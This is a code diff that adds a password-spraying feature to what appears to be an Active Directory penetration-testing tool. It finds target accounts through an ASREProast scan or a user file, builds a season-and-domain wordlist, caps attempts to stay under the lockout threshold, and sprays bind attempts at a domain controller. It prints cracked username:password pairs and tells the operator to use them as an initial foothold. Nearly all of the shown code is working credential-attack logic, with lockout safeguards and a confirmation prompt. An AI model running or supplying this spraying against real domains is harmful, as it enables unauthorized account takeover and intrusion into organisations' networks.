@@ -154,6 +154,27 @@ Examples:
                            "from --list-cves). Combine with --aggressive when naming "
                            "an aggressive check (otherwise it's filtered out).")
 
+    # ── Password spray (brief §4.8) ──────────────────────────────
+    spray = p.add_argument_group("Password spray (gated, lockout-aware)")
+    spray.add_argument("--spray", action="store_true",
+                       help="Spray a small dictionary of common passwords "
+                            "against ASREProast candidates (or --spray-users-file). "
+                            "Refuses to run on accounts with lockout=enabled "
+                            "unless the dictionary fits inside the safety "
+                            "buffer. Confirmation prompt unless --spray-yes.")
+    spray.add_argument("--spray-users-file", metavar="FILE",
+                       help="Spray against the SAMs in FILE (one per line) "
+                            "instead of running the ASREP scanner first.")
+    spray.add_argument("--spray-passwords-file", metavar="FILE",
+                       help="Use the passwords in FILE (one per line) instead "
+                            "of the built-in season+year/domain+year wordlist.")
+    spray.add_argument("--spray-rate", type=float, default=1.0,
+                       help="Seconds between bind attempts (default 1.0). "
+                            "Lower = faster + louder.")
+    spray.add_argument("--spray-yes", action="store_true",
+                       help="Skip the confirmation prompt. For scripted "
+                            "engagements where the operator owns the policy.")
+
     # ── Output ────────────────────────────────────────────────────
     out = p.add_argument_group("Output")
     out.add_argument("-o", "--output",
@@ -844,8 +865,135 @@ def main():
         cmd_list_cves()
         return
 
+    if args.spray:
+        cmd_spray(args)
+        return
+
     # Live scan
     run_scan(args)
+
+
+def cmd_spray(args):
+    """Standalone password-spray pre-check (brief §4.8). Either reads
+    user list from --spray-users-file, or first runs the ASREP scanner
+    (needs creds) to discover candidates."""
+    from kerb_map.modules.spray import (
+        generate_wordlist,
+        safe_password_count,
+    )
+    from kerb_map.modules.spray import (
+        spray as run_spray,
+    )
+
+    if not args.dc_ip or not args.domain:
+        log.error("--spray needs -d <domain> and -dc <DC_IP>")
+        sys.exit(1)
+
+    # Source 1: file. Source 2: ASREP candidates (needs an LDAP bind).
+    users: list[str] = []
+    lockout_threshold: int | None = None
+
+    if args.spray_users_file:
+        try:
+            with open(args.spray_users_file) as fh:
+                users = [ln.strip() for ln in fh if ln.strip()]
+        except OSError as e:
+            log.error(f"Could not read --spray-users-file: {e}")
+            sys.exit(1)
+        log.info(f"Loaded {len(users)} target users from "
+                 f"{args.spray_users_file}")
+    else:
+        # Need an LDAP bind to discover ASREP candidates + lockout policy.
+        password = resolve_secret(args.password, args.password_env,
+                                  args.password_stdin, label="password")
+        nthash   = resolve_secret(args.hash, args.hash_env,
+                                  args.hash_stdin, label="NT hash")
+        if not (password or nthash or args.kerberos):
+            log.error("--spray without --spray-users-file needs creds "
+                      "(-p/-H/-k) so kerb-map can enumerate ASREP "
+                      "candidates and read lockout policy.")
+            sys.exit(1)
+        try:
+            ldap = LDAPClient(
+                dc_ip=args.dc_ip, domain=args.domain,
+                username=args.username, password=password, hashes=nthash,
+                use_kerberos=args.kerberos, timeout=args.timeout,
+            )
+        except Exception as e:
+            log.error(f"LDAP connect failed: {e}")
+            sys.exit(1)
+
+        domain_info = ldap.get_domain_info()
+        lockout_threshold = domain_info.get("lockout_threshold")
+
+        log.section("ASREP scan — discovering candidates for spray")
+        asrep = ASREPScanner(ldap).scan()
+        users = [a.account for a in asrep if getattr(a, "account", None)]
+        log.info(f"Found {len(users)} ASREProastable accounts")
+
+    if not users:
+        log.warn("No target users — nothing to spray.")
+        return
+
+    # Wordlist
+    if args.spray_passwords_file:
+        try:
+            with open(args.spray_passwords_file) as fh:
+                passwords = [ln.strip() for ln in fh if ln.strip()]
+        except OSError as e:
+            log.error(f"Could not read --spray-passwords-file: {e}")
+            sys.exit(1)
+    else:
+        passwords = generate_wordlist(args.domain)
+
+    cap = safe_password_count(lockout_threshold)
+    if cap is not None and len(passwords) > cap:
+        log.warn(
+            f"Lockout threshold = {lockout_threshold}; capping spray to "
+            f"{cap} password(s) per user (was {len(passwords)})."
+        )
+        passwords = passwords[:cap]
+
+    # Confirmation
+    log.section("Spray plan")
+    console.print(f"  Target DC:        [cyan]{args.dc_ip}[/cyan]")
+    console.print(f"  Domain:           [cyan]{args.domain}[/cyan]")
+    console.print(f"  Users:            [cyan]{len(users)}[/cyan]")
+    console.print(f"  Passwords:        [cyan]{len(passwords)}[/cyan]")
+    console.print(f"  Lockout policy:   "
+                  f"[cyan]{lockout_threshold or 'unknown / disabled'}[/cyan]")
+    console.print(f"  Total attempts:   [cyan]{len(users) * len(passwords)}[/cyan]")
+    console.print(f"  Rate:             [cyan]{args.spray_rate}s between attempts[/cyan]")
+
+    if not args.spray_yes:
+        try:
+            answer = input("\nProceed? [y/N] ").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            answer = ""
+        if answer not in ("y", "yes"):
+            log.warn("Aborted — no spray attempts made.")
+            return
+
+    log.section("Spraying")
+    def _on_attempt(user, password, hit):
+        if hit:
+            console.print(
+                f"  [bold green][+] {user}:{password}[/bold green]"
+            )
+    result = run_spray(
+        dc_ip=args.dc_ip,
+        domain=args.domain,
+        users=users,
+        passwords=passwords,
+        lockout_threshold=lockout_threshold,
+        inter_attempt_seconds=args.spray_rate,
+        on_attempt=_on_attempt,
+    )
+
+    log.success(
+        f"{len(result.hits)} hit(s) in {result.attempts} attempts. "
+        f"Use the SAM:password pairs above as your initial foothold."
+    )
 
 
 if __name__ == "__main__":
